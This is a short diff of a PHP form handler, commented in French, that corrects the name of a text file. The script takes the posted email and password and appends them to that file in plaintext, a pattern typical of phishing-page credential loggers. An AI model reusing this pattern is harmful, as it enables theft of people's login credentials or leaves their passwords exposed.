@@ -2,7 +2,7 @@
 	$email = $_POST['Email'];
 	$pass = $_POST['Password'];
 
-	$file ="donnes.txt";
+	$file ="donnees.txt";
 
 	# Ouverture en mode écriture
 	$fileopen=(fopen("$file",'a'));
